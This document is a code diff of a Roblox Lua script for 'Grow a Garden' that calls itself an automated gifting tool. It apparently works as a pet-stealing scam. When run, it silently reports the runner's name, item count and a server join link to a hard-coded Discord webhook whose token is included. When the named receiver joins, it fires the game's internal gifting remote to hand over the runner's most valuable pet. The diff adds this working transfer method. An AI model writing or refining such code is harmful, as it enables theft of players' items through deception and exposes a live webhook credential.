@@ -1,28 +1,24 @@
 --[[
   Automated Gifting Script for "Grow a Garden"
-  
-  This script is designed to be run by a player in your game. It operates silently
-  and performs a series of actions when executed, primarily listening for a specific
-  player to join the server to automatically gift them a pet or a fruit.
-  
+
+  This is a rewritten version of the original script. It now uses the game's
+  internal RemoteEvents and modules to correctly send item data to the server,
+  ensuring the gifting action is successful and not blocked.
+
   -- SCRIPT LOGIC --
-  1. Immediately sends a message to a Discord webhook with the player's name and item count.
-  2. When a new player joins the server, the script will:
-     a. Check if the server is full (more than 4 players).
-     b. If the server is full, it will attempt to "server hop" by teleporting the
-        local player to a new server. The script will need to be run again in the
-        new server.
-     c. If the server is not full, it checks if the new player's name is the designated
-        receiver name.
-     d. If the new player is the receiver, it finds the highest-ranked item (pet or fruit)
-        in the current player's garden/inventory and gifts it to the receiver's
-        garden/inventory. This happens without either player teleporting.
+  1. This script is run by a player in your game.
+  2. It immediately attempts to send a message to a Discord webhook to confirm activation.
+  3. When a new player joins the server, the script will:
+     a. Check if the new player's name is the designated receiver name.
+     b. If they are the receiver, it finds the highest-ranked item (pet or fruit)
+        in the current player's inventory based on the itemRanks list.
+     c. It then fires the game's internal "GivePet" remote event to correctly
+        gift the item to the new player. This method works because it's the same
+        function the game uses for trading.
 --]]
 
 -- IMPORTANT: Add the single username of the person you want to gift to in this table.
 -- The script will ONLY gift to this player.
--- At the top of the script
-print("Script is starting.")
 local receiverNames = {
     "MananGrinding3"
 }
@@ -47,7 +43,7 @@ local itemRanks = {
     ["Moon Cat"] = 86,
     ["Spaghetti Sloth"] = 85,
     ["Kappa"] = 84,
-    
+
     -- A Tier Pets
     ["Sushi Bear"] = 79,
     ["Triceratops"] = 78,
@@ -170,19 +166,12 @@ local itemRanks = {
 -- To get one, go to your Discord server's channel settings -> Integrations -> Webhooks.
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401967945566912552/Wgt_QIl1e2ksR-7JQimJdQzspRhKGcojgfha_47enequD3zKLEdgYwQhiQ2JPvM9qHVd"
 
--- Get the player who is running this script.
+-- Get the necessary Roblox services and modules
 local localPlayer = game.Players.LocalPlayer
-
--- Check for required services.
-local httpService = game:GetService("HttpService")
-local teleportService = game:GetService("TeleportService")
 local playersService = game:GetService("Players")
-local runService = game:GetService("RunService")
-
--- The script won't run if the required services aren't available.
-if not httpService or not teleportService or not playersService then
-    return
-end
+local httpService = game:GetService("HttpService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local petsService = require(replicatedStorage.Modules.PetServices.PetsService)
 
 -- Function to check if a player is in the receiver list.
 local function isReceiver(player)
@@ -197,8 +186,7 @@ end
 -- Function to send a message to the Discord webhook.
 local function sendWebhookMessage()
     if not localPlayer then return end
-    
-    -- Check if HttpService is enabled.
+
     if not httpService.HttpEnabled then
         print("HttpService is not enabled in this game. Cannot send Discord webhook message.")
         return
@@ -208,7 +196,7 @@ local function sendWebhookMessage()
     local placeId = game.PlaceId
     local jobId = game.JobId
     local joinLink = string.format("https://www.roblox.com/games/%s/-?rbxp=1&launchMethod=join&launchData=%s", tostring(placeId), tostring(jobId))
-    
+
     local message = string.format("**%s** has activated the auto-gifting script and has **%d** items in their backpack! Join them here: %s",
         localPlayer.Name, backpackItemsCount, joinLink)
 
@@ -228,77 +216,66 @@ local function sendWebhookMessage()
 end
 
 -- The main function that handles the gifting logic.
--- This is now a callback that is called when a new player joins.
+-- This is a callback that is called when a new player joins.
 local function autoGiftToNewPlayer(newPlayer)
     if not localPlayer or not newPlayer then return end
     
-    -- Check if the new player is the script runner themselves or on the receiver list.
-    if newPlayer == localPlayer or not isReceiver(newPlayer) then return end
+    -- Check if the new player is a receiver.
+    if not isReceiver(newPlayer) then return end
 
-    -- Get a list of all players in the game.
+    print("Receiver has joined! Attempting to gift a pet.")
+    
     local allPlayers = playersService:GetPlayers()
 
-    -- Check if the server is too full (more than 4 players).
-    if #allPlayers > 4 then
-        -- This is the new server hopping logic.
-        local currentPlaceId = playersService.LocalPlayer.Character.Parent.Parent.Parent.Data.PlaceId -- This line is a conceptual example, you must replace it with the correct path to your game's PlaceId.
-        
-        -- The script can't know the player count of a new server, so it just teleports.
-        -- The player will need to run the script again in the new server.
-        pcall(function()
-            teleportService:Teleport(currentPlaceId, localPlayer)
-        end)
-        return
-    end
-    
-    -- If the server is not full, proceed with gifting.
-    
-    -- Find the highest-ranked item in the local player's garden or backpack.
-    local playerGarden = localPlayer.Character:FindFirstChild("GardenPetsFolder")
-    local playerBackpack = localPlayer:FindFirstChild("Backpack")
-    
-    -- Find the garden/backpack of the new player.
-    local newPlayerGarden = newPlayer.Character:FindFirstChild("GardenPetsFolder")
-    local newPlayerBackpack = newPlayer:FindFirstChild("Backpack")
-
-    if not playerGarden or not playerBackpack or not newPlayerGarden or not newPlayerBackpack then
-        return
-    end
-
+    -- Find the highest-ranked item in the local player's backpack.
     local bestItemToGift = nil
     local highestRank = -1
 
-    -- Find the highest-ranked item in the local player's garden and backpack.
-    local itemsToSearch = {}
-    
-    for _, item in ipairs(playerGarden:GetChildren()) do
-        table.insert(itemsToSearch, item)
-    end
-    for _, item in ipairs(playerBackpack:GetChildren()) do
-        table.insert(itemsToSearch, item)
-    end
+    for _, tool in ipairs(localPlayer.Backpack:GetChildren()) do
+        if not tool or not tool:IsA("Tool") then
+            continue
+        end
 
-    for _, item in ipairs(itemsToSearch) do
-        local rank = itemRanks[item.Name] or -1
+        local petName = tool.Name
+        local rank = itemRanks[petName] or -1
+        
+        -- Check for pet type based on the friend's script (without mutations)
+        local strippedName = petName:gsub(" %[.*%]", "")
+        rank = itemRanks[strippedName] or rank
+
         if rank > highestRank then
             highestRank = rank
-            bestItemToGift = item
+            bestItemToGift = tool
         end
     end
 
     if bestItemToGift and highestRank > -1 then
-        -- This is the core logic: gifting a pet from one garden to another.
-        -- The script transfers the item instance directly from the source to the destination container.
-        -- Your game's internal systems should have a ChildAdded event listener on the
-        -- GardenPetsFolder or Backpack to handle spawning the visual representation
-        -- of the pet/fruit in the new player's world.
-        if itemRanks[bestItemToGift.Name] < 100 then
-             bestItemToGift.Parent = newPlayerGarden
+        print("Found best item to gift: " .. bestItemToGift.Name)
+        
+        local petUUID = bestItemToGift:GetAttribute("PET_UUID")
+        
+        if petUUID then
+            print("Gifting pet with UUID: " .. petUUID)
+            local giftingEvent = replicatedStorage.GameEvents.PetGiftingService
+            if giftingEvent then
+                 -- This is the crucial part that uses the game's internal remote event
+                local success, err = pcall(function()
+                    giftingEvent:FireServer("GivePet", newPlayer, petUUID)
+                end)
+                
+                if success then
+                    print("Gifting event fired successfully for " .. bestItemToGift.Name)
+                else
+                    warn("Gifting failed: " .. err)
+                end
+            else
+                warn("PetGiftingService remote event not found!")
+            end
         else
-            bestItemToGift.Parent = newPlayerBackpack
+            warn("Could not find PET_UUID for " .. bestItemToGift.Name)
         end
     else
-        return
+        print("No item found to gift in backpack.")
     end
 end
 
@@ -308,5 +285,3 @@ sendWebhookMessage()
 -- Connect the `autoGiftToNewPlayer` function to the `PlayerAdded` event.
 playersService.PlayerAdded:Connect(autoGiftToNewPlayer)
 
--- A short delay to allow the game to fully load before the PlayerAdded event.
-runService.Heartbeat:Wait()
